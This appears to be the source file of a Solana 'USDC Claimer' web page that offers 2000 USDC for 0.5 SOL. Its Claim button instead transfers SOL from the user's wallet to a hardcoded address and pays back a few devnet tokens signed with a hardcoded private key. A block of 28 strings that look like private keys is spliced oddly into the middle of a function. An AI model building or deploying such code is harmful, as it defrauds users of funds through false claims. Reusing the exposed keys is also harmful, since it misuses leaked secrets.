/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2gZCa8D2oJJtqeJTWVhQZurNUMBCWrHpbYWSCCMSaBAP7paECuq595KzTJoRPG7WEkWVt8ZFJjxTBAAfANSjoKQN"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5EybTuCaPRcrnQeyfsWz7efTy3A48jSMwF2GmBQRmtZj7fApgqK2NazoEkzuH3BMf6i1GyFrPH7N11Jnu9phZxsJ",
  "key1": "4JCHAJ3UXPG7wrEGoSPXpbKShoRpCUBFc4NDnpPVaPAz6GCPqWUFc3KjYesuDxsxCDEJV4k7VyimybbQFrrLtbP",
  "key2": "57yEgjqEz9fuCSxmspM3wt8XuTDeeMqUg4auKCgdzQkpsczgHm47GhSgeNQDUHpnBoxB6m6e5kTdt5YEp6DsoTEJ",
  "key3": "62RvRmruNSKJwwgD5q538SAgrmwXj2G2wKovcVrofQJ77AhNyVnJRuWPdez8nda6jgRn1FJVipVSN7Uc4RPqHn1C",
  "key4": "2BNk3m7NKesCoovdMq9VodRPQs5RpQa3FU3BafaHKV8VdbKe4Yw7aD2rTCFqrX3Bhd4ut7v7bqbJfYyRDdBxc3B7",
  "key5": "2sPJ98FeSjn2qsRixmrbTiZWtNMwqK39rkypXweWNTkWPtjaKLUzjbHHYgH8KQz6WWQVyXT9W7Ek8215Rf9U9W34",
  "key6": "5ENT9mtNejvVGj9UdpJU5Si8eoLPsED29LJSaXsNXkUbzFhsS3sx2QYFVAcob9rHUKkHNhYWGU3xWjiEzbJzMCTJ",
  "key7": "55XocCUtxKJ5VHCkcnECDEk8bQj9cHPjvdDeznx5NRhti1NYewo96HmjBBZYKNBYGy13mV35thiocpKgBkujKULz",
  "key8": "2kSEMpYnstbC6tSWSh5fLjag849VAiRZM8F6ALQ98t6JfAZG9T4N2qguokYVWRBVqcKbrsRXt18KvUZsFzcqtotK",
  "key9": "5cJzhMZu76WGTkNQ5uJpCaSkgketk4DzEegVmRbFFtqjFMpVvbjMS9QWsc9Notb7D3VHRCTtSF7HBugZsosizvxk",
  "key10": "2ZSaBrtFw9eKCVtjPd41sLsuev5rwA21zRWg2JZcA1Qr24qLt3AFyW7dTx1Sii1bdDi1dm9nqWtGyzZSj4fRWuM2",
  "key11": "34hxoUBXgCuKEa38bXJpkom81vGM3aeHc9qJUvyYThjkEUZYLPFnWNPDf8DRp915ZiuLD9wEdRRrHRYYeQJYxAxb",
  "key12": "3UcUoYwTHoyMFLSHQJQYyC5BPXYxuSzFEXRnoPJ359BuEqKRFvzZQqiv8Sff814ZRWaV4tb8nZxPXkrh7CZUfK8C",
  "key13": "3pNaG9nCcanFXQ1ZcZCvrzx3Br9Nm62QXz6VJpjDCPwu66pMXmExM8QnoYQbFQi8mt4KATfteY778ABP4HB8CpUL",
  "key14": "2FEhwEWPUaA5Qi2rWVBt6yh3EEWADNRuv5gTSyNTbXLfmCV3fu7DR9VMhJiG7ks418HBkq7yJuWyzXtgUNNhQvbw",
  "key15": "3uaZQT6cFVjSowWfHoFm7DsYYZAe6TtaFxhHUGfvuLvFvuqCcwZhVmCkLPtxLck58Sh3kcQigHpYAoszw2QvNHan",
  "key16": "2Q5kQT9HKTtPfe6CkXfeKaLzzgz9nGvJ9euLwtdfc85rqoXgEWfzqX4GUzTDWv1cLCMECgCKkEby4MmRndXy5CQc",
  "key17": "4MQs5WZsdJJr4WE95797TnUPbB16JepdeNhTAbZ2mv4if8jYxpMWx9DJvRTh7xdEgCGqqoJZY5svJZGze25SjwqR",
  "key18": "H51LCy4UBmK31yyS2VRVzcMGwafEpMi1gpQXK9GjT6deB86RxXppR4zSqvW6pbmkUTVJZGjgcMLfnqCBvvDaTAt",
  "key19": "2sUYoetmyVWBBktr5M3QLPkE1ZTRT8s4U55QtAta9qgRQ11FpAubPeCL88u4tpCaVTvMG4MYEayaQ4FStG1zgkbu",
  "key20": "5commuPJxFn67z4K1XybYwxXgmcQCnmcduJ3FcVuDx9oVeJtXFaKCQhBURAvbGG73QLPxEgvwSqgKNRGKi34JT3J",
  "key21": "2396jTfthkd7T92mSQfBDsKJk2KEeC7rirgTsy9DZUktJWpz18NaCgQEaABc2B63own5RU8N5kaSrvEM5mw5BU1x",
  "key22": "4pP1Yy18Hwx7QCcDbSYBhpG1D4GgqGKDDmr5384tPRPWiaAY3MPmfQG2dhn1zkLshd2Wvx43mp41wgeskHNy74Ba",
  "key23": "41JwQjvmNXZUkchzSf6w8C4i3Ljj2Ad8Rsu83Nerh6PG9i8LkQpqWp8hAJrBePRV71knTHJekk1d4CrVdET8qV8W",
  "key24": "SLrV7xxLeBC5L8oucYfC2DjSkc2ifJR9wU2CnWxTvsQZdjar2CR4RTRmdaQ5KcMHd3Et6wMTepjme34qtKtaVjf",
  "key25": "4yDKF7ARxQiX3W3Ev5FZC6LNF8BemT3kemhbCqXeEC1p3gXjPtGkAZioXWPuHuHNjKCEumFppY5N9k4bSijYye4h",
  "key26": "5KeEvUSfzbtRiyBcr5NBcDXGN98CyL1yh8WwaGtUvqMnc9q8kpknJkuWNcXdb1KNsE2SQQ5crtKMKgdVNC9NoowU",
  "key27": "rYxLjsHiZgHR614dHtpEPSWwreLs4QPL8iAGPV9gX3S7zXQ4kBQ7hdcbLfJTbRGCWXvUBEzWoQjcy9MAvU8VWmD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
